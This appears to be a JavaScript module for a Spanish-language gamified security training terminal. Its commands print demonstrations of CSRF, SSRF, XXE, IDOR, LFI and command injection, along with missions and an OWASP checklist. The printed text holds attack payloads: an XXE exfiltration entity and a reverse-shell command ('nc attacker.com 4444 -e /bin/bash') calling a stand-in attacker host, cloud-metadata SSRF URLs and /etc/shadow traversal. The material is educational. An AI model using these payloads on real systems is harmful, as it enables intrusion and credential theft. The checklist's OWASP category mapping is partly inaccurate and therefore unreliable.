/* ============================================================================
   MÓDULO: OWASP Advanced
   CSRF, SSRF, XXE, IDOR, LFI/RFI, Path Traversal, Command Injection.
   env = { vulnerabilities, payloads }
============================================================================ */

const initEnv = () => ({
    vulns: {
        csrf: { status: 'found', endpoint: 'POST /transfer', token: false },
        ssrf: { status: 'found', endpoint: 'GET /image?url=', accessible: ['http://localhost:8000', 'http://metadata.service/'] },
        xxe: { status: 'found', endpoint: 'POST /upload?format=xml', parser: 'default (unsafe)' },
        idor: { status: 'found', endpoint: 'GET /api/user?id=', auth_check: false },
        lfi: { status: 'found', endpoint: 'GET /download?file=', filter: 'none', readable: ['/etc/passwd', '/etc/shadow', '/var/www/config.php'] },
        cmdi: { status: 'found', endpoint: 'GET /ping?host=', sanitize: false }
    }
})

const commands = {
    'csrf-demo': (args, env) => {
        return {
            out: [
                '=== CSRF (Cross-Site Request Forgery) ===',
                '',
                'Vulnerable endpoint: POST /transfer',
                '  Parámetros: to_account, amount',
                '  CSRF token: NO',
                '',
                'Ataque:',
                '  1. Creas attacker.com',
                '  2. Pones HTML:',
                '     <form action="bank.com/transfer" method="POST">',
                '       <input name="to_account" value="attacker_account">',
                '       <input name="amount" value="10000">',
                '       <input type="submit" value="Click aquí!">',
                '     </form>',
                '  3. Víctima logueada en bank.com hace click',
                '  4. Browser envía cookies automáticamente → dinero transferido',
                '',
                'Prevención: tokens CSRF únicos por sesión + SameSite cookie'
            ],
            events: [{ t: 'owasp_csrf' }]
        }
    },

    'ssrf-demo': (args, env) => {
        return {
            out: [
                '=== SSRF (Server-Side Request Forgery) ===',
                '',
                'Vulnerable endpoint: GET /image?url=',
                'Servidor busca imágenes en URL que TÚ proporcionas.',
                '',
                'Ataque 1 - Cloud metadata:',
                '  /image?url=http://metadata.service/latest/meta-data/iam/security-credentials/',
                '  ↓ Servidor hace request',
                '  ↓ Response contiene AWS access keys',
                '  ↓ Tú robas las keys',
                '',
                'Ataque 2 - Internal scanning:',
                '  /image?url=http://localhost:8000/',
                '  ↓ Servidor accede a localhost (que tú no puedes)',
                '  ↓ Encuentras servicios internos',
                '',
                'Ataque 3 - Port scanning:',
                '  /image?url=http://192.168.1.1:22',
                '  ↓ Timing attack: respuesta rápida = puerto abierto',
                '',
                'Prevención: whitelist de dominios, no permitir localhost/private IPs'
            ],
            events: [{ t: 'owasp_ssrf' }]
        }
    },

    'xxe-demo': (args, env) => {
        return {
            out: [
                '=== XXE (XML External Entity Injection) ===',
                '',
                'Vulnerable endpoint: POST /upload?format=xml',
                'Servidor procesa XML sin deshabilitar external entities.',
                '',
                'Ataque 1 - File disclosure:',
                '  Payload:',
                '  <!DOCTYPE foo [',
                '    <!ENTITY xxe SYSTEM "file:///etc/passwd">',
                '  ]>',
                '  <data>&xxe;</data>',
                '  ↓ Response contiene contenido de /etc/passwd',
                '',
                'Ataque 2 - Out-of-band data exfiltration:',
                '  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=...">',
                '  ↓ Server hace request a tu servidor con datos',
                '',
                'Ataque 3 - DoS (Billion Laughs):',
                '  <!DOCTYPE lolz [',
                '    <!ENTITY lol "lol">',
                '    <!ENTITY lol2 "&lol;&lol;&lol;...">',
                '  ]>',
                '  ↓ Exponencial expansion → server crashes',
                '',
                'Prevención: deshabilitar DTD, external entities en XML parser'
            ],
            events: [{ t: 'owasp_xxe' }]
        }
    },

    'idor-exploit': (args, env) => {
        const user_id = args[0] || '1'
        return {
            out: [
                `=== IDOR (Insecure Direct Object Reference) ===`,
                ``,
                `Vulnerable endpoint: GET /api/user?id=${user_id}`,
                `Servidor retorna datos del usuario sin verificar autorización.`,
                ``,
                `Ataque:`,
                `  GET /api/user?id=1  → Tu perfil (datos tuyos)`,
                `  GET /api/user?id=2  → Admin profile (nombres, emails, teléfono)`,
                `  GET /api/user?id=3  → User 3 (contraseña hasheada)`,
                `  ...`,
                `  GET /api/user?id=999 → CEO profile`,
                ``,
                `Impacto: enumeras TODOS los usuarios, robas datos personales/sensibles`,
                ``,
                `Prevención: verificar en backend que el usuario logueado es dueño del recurso`,
                `  if (request.user.id != params.id) return 403 Forbidden`
            ],
            events: [{ t: 'owasp_idor', user_id }]
        }
    },

    'lfi-exploit': (args, env) => {
        const file = args[0] || '/etc/passwd'
        return {
            out: [
                `=== LFI (Local File Inclusion) ===`,
                ``,
                `Vulnerable endpoint: GET /download?file=`,
                `Servidor lee archivos del filesystem sin validación.`,
                ``,
                `Ataque:`,
                `  GET /download?file=/etc/passwd`,
                `  root:x:0:0:root:/root:/bin/bash`,
                `  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`,
                `  ...`,
                ``,
                `  GET /download?file=../../../etc/shadow`,
                `  (root hashes)`,
                ``,
                `  GET /download?file=/var/www/html/config.php`,
                `  define('DB_PASSWORD', 'super_secret_123');`,
                ``,
                `Impacto: robar archivos del servidor, credenciales, código fuente`,
                ``,
                `Path traversal: usar ../ para subir directorios`,
                `Prevención: whitelist de archivos permitidos, no usar user input en rutas`
            ],
            events: [{ t: 'owasp_lfi', file }]
        }
    },

    'cmdi-exploit': (args, env) => {
        const host = args[0] || '8.8.8.8'
        return {
            out: [
                `=== Command Injection ===`,
                ``,
                `Vulnerable endpoint: GET /ping?host=`,
                `Backend: system("ping -c 1 " + host)`,
                ``,
                `Ataque:`,
                `  GET /ping?host=8.8.8.8; whoami`,
                `  → server ejecuta: ping -c 1 8.8.8.8; whoami`,
                `  → Response: whoami output (www-data, apache, etc)`,
                ``,
                `Escalada:`,
                `  GET /ping?host=8.8.8.8; cat /etc/passwd`,
                `  GET /ping?host=8.8.8.8; id`,
                `  GET /ping?host=8.8.8.8; nc attacker.com 4444 -e /bin/bash`,
                `  → Reverse shell`,
                ``,
                `Impacto: RCE (Remote Code Execution) = acceso total`,
                ``,
                `Prevención: NUNCA usar user input en system/exec/shell_exec`,
                `  Usar: escapeshellarg(), whitelists, APIs seguras`
            ],
            events: [{ t: 'owasp_cmdi', host }]
        }
    },

    'owasp-checklist': () => ({
        out: [
            '=== OWASP Top 10 2023 Checklist ===',
            '',
            'A01: Broken Access Control',
            '  - IDOR (ID enumeration) → ✓ covered',
            '  - Unauthorized actions sin verificar permisos',
            '',
            'A02: Cryptographic Failures',
            '  - Data en tránsito sin HTTPS',
            '  - Contraseñas en plain text',
            '',
            'A03: Injection',
            '  - SQLi → covered',
            '  - Command Injection → ✓ covered',
            '  - LDAP/OS Command injection',
            '',
            'A04: Insecure Design',
            '  - CSRF → ✓ covered',
            '  - Sin rate limiting',
            '',
            'A05: Security Misconfiguration',
            '  - Default credentials',
            '  - Servicios innecesarios abiertos',
            '',
            'A06: Vulnerable and Outdated Components',
            '  - Librerías con CVEs',
            '',
            'A07: Identification and Authentication Failures',
            '  - Session fixation',
            '  - Weak password policy',
            '',
            'A08: Software and Data Integrity Failures',
            '  - XXE → ✓ covered',
            '  - Deserialization unsafe',
            '',
            'A09: Logging and Monitoring Failures',
            '  - Sin auditing',
            '',
            'A10: SSRF',
            '  - Server-side request forgery → ✓ covered'
        ]
    }),

    'help': () => ({ out: ['Comandos OWASP Advanced:', '  csrf-demo  ssrf-demo  xxe-demo  idor-exploit <id>  lfi-exploit <file>', '  cmdi-exploit <host>  owasp-checklist  help'] })
}

const missions = [
    {
        id: 'owasp1', title: 'Explotación CSRF', xp: 70,
        brief: 'CSRF = atacante hace que víctima haga una acción sin saberlo. Sin tokens únicos, es trivial.',
        obj: 'Revisa csrf-demo para entender el ataque.',
        hint: 'csrf-demo',
        check: ev => ev.some(e => e.t === 'owasp_csrf')
    },
    {
        id: 'owasp2', title: 'SSRF para robar credenciales', xp: 100,
        brief: 'SSRF = haces que el servidor haga requests por ti. Accedes a localhost, metadata services, y robas keys/credenciales.',
        obj: 'Entiende cómo ssrf-demo explota metadata services.',
        hint: 'ssrf-demo',
        check: ev => ev.some(e => e.t === 'owasp_ssrf')
    },
    {
        id: 'owasp3', title: 'XXE para leer archivos', xp: 90,
        brief: 'XXE = inyectas entidades XML que hace que el parser lea archivos del sistema y te los devuelva.',
        obj: 'Revisa xxe-demo para ver /etc/passwd disclosure.',
        hint: 'xxe-demo',
        check: ev => ev.some(e => e.t === 'owasp_xxe')
    },
    {
        id: 'owasp4', title: 'IDOR enumeration', xp: 80,
        brief: 'IDOR = si cambias un ID en la URL, accedes a datos de otros usuarios sin permiso. Enumeras todos.',
        obj: 'Explota IDOR para acceder a user id=2.',
        hint: 'idor-exploit 2',
        check: ev => ev.some(e => e.t === 'owasp_idor')
    },
    {
        id: 'owasp5', title: 'LFI para robar config', xp: 90,
        brief: 'LFI = path traversal. Si parámetro va directo a open(file), lees cualquier archivo con permisos del servidor.',
        obj: 'Explota LFI para leer /etc/passwd.',
        hint: 'lfi-exploit /etc/passwd',
        check: ev => ev.some(e => e.t === 'owasp_lfi')
    }
]

export default {
    id: 'owaspadv', icon: '⚠️', name: 'OWASP Advanced', sub: 'CSRF, SSRF, XXE, IDOR, LFI, Command Injection',
    initEnv,
    prompt: () => 'owasp>',
    intro: ['Módulo OWASP ADVANCED cargado. Aquí están los ataques más peligrosos y comunes de web.',
        'CSRF, SSRF, XXE, IDOR, LFI = el 80% de vulnerabilidades de web apps reales.'],
    commands, missions
}